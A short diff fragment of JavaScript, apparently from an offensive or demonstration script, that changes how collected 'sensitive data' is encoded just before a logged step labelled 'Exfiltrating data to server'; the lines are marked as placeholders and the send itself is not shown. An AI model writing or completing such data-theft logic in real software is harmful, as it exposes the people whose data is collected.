@@ -100,7 +100,7 @@
       };
       
       console.log("[+] Placeholder: Found sensitive data:", sensitiveData);
-      const encodedData = btoa(JSON.stringify(sensitiveData));
+      const encodedData = JSON.stringify(sensitiveData);
       
       console.log("[*] Placeholder: Exfiltrating data to server...");
       try {
